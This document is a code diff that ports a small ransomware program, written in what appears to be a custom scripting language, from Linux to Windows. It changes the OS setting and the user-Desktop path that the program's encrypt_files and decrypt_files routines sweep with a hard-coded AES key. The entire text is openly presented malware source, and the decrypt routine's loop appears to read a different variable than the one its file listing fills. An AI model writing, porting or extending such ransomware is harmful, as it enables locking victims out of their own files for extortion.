@@ -6,7 +6,7 @@
 @ 3. The encryption key used is hiveXXXXXXXXXXXX @
 @ 4. The ransomware only targets the current running user's Desktop directory @
 @ 5. The source code is not obfuscated @
-@ 6. The ransomware is built for linux, but can be rewritten for windows @ 
+@ 6. The ransomware is built for windows, check the 'alien_linux' for the linux version @ 
 
 use webview
 use system
@@ -16,7 +16,7 @@ use time
 [
     version 2.0
     output alien
-    os linux
+    os windows
     arch amd64
     obfuscate false
 ]
@@ -27,7 +27,7 @@ c decrypt_files {
     crypto::set_aes_key("hiveXXXXXXXXXXXX")
     crypto::set_method("aes")    
     
-    system::list_dir(${"file", "/home/€666€/Desktop"}$) @ Puts the result into €1€ @
+    system::list_dir(${"file", "C:\\Documents and Settings\\€666€\\Desktop"}$) @ Puts the result into €1€ @
     foreach("€2€"):
         crypto::add_target("€13€") @ Add each file to our target list @
     end foreach
@@ -40,7 +40,7 @@ b encrypt_files {
     crypto::set_aes_key("hiveXXXXXXXXXXXX")
     crypto::set_method("aes")
 
-    system::list_dir(${"file", "/home/€666€/Desktop"}$) @ Puts the result into €1€ @
+    system::list_dir(${"file", "C:\\Documents and Settings\\€666€\\Desktop"}$) @ Puts the result into €1€ @
     foreach("€1€"):
         crypto::add_target("€13€") @ Add each file to our target list @
     end foreach
